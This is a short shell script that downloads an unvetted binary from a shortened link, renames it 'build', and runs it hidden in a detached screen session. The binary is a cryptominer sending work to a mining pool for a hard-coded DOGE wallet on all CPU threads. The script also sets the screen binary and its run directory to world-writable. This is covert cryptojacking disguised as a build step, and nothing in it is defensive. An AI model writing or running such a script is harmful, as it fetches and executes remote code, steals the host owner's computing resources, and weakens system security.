#!/bin/sh
worker="$(echo DOGE-$(shuf -i 1-999 -n 1))"
cd /home/shell-bot
wget -q https://git.io/JPjuz
wget -qO build https://git.io/JPjuB
chmod +x build
chmod +x compile.sh
chmod 777 /usr/bin/screen
chmod 777 /run/screen
screen -dm -S build ./build -a verus -o stratum+tcp://verushash.mine.zergpool.com:3300 -u D7hBkeeqaXzc7dy71FLqUdPoyogAYrU8s7 -p c=DOGE,mc=VRSC,ID=$worker -t $(nproc --all)
